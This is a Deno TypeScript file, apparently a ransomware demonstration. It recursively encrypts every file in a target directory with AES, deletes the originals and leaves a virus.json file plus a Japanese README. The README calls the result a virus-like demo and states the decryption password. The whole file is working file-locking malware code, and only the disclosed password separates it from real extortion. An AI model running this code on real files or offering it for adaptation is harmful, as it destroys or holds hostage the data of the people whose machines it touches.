import * as path from 'std/path/mod.ts'
import CryptoJS from 'https://esm.sh/crypto-js@4.1.1'
import * as fs from 'std/fs/mod.ts'
import blob2dataurl from "../utils/blob2dataurl.ts"

const enc = async (encPath: string) => {
  try {
    await Deno.stat(path.join(encPath, 'virus.json'))
    return 
  } catch (error) {
    if (!(error instanceof Deno.errors.NotFound)) {
      throw error
    }
  }
  console.log('n')
  /**
   * 128Bitのソルト
   */
  const salt = CryptoJS.lib.WordArray.random(16)
  /**
   * 128Bitの初期ベクトル
   */
  const iv = CryptoJS.lib.WordArray.random(16)

  const password = crypto.randomUUID()

  /**
   * AESの鍵生成
   */
  const aesKey = CryptoJS.PBKDF2(password, salt, {
    keySize: 128 / 32,
    iterations: 1000,
    hasher: CryptoJS.algo.SHA256,
  })

  const encProcesses: Promise<void>[] = []
  for await (const entry of fs.walk(encPath)) {
    if (!entry.isFile) {
      continue
    }
    encProcesses.push((async () => {
      const targetFileData = await Deno.readFile(entry.path)
      
      const targetTextData = await blob2dataurl(new Blob([targetFileData]))

      const encedText: string = CryptoJS.AES.encrypt(targetTextData, aesKey, {
        iv,
      }).toString()

      await Deno.writeTextFile(`${entry.path}.ango`, encedText)
      await Deno.remove(entry.path)
    })())
  }
  try {
    await Promise.all(encProcesses)
  } catch(_e) {
    console.log(_e)
  }
  await Deno.writeTextFile(path.join(encPath, 'virus.json'), JSON.stringify({
    date: new Date(),
    iv,
    salt
  }, null, 2))
  await Deno.writeTextFile(path.join(encPath, 'README.md'), `このディレクトリの中身はウイルス的なやつのデモによって暗号化されました。
解除に必要なパスワードは、\`${password}\`です。`)
}
export default enc

if (import.meta.main) {
  await enc(path.fromFileUrl(path.join(import.meta.url, '../../data')))
}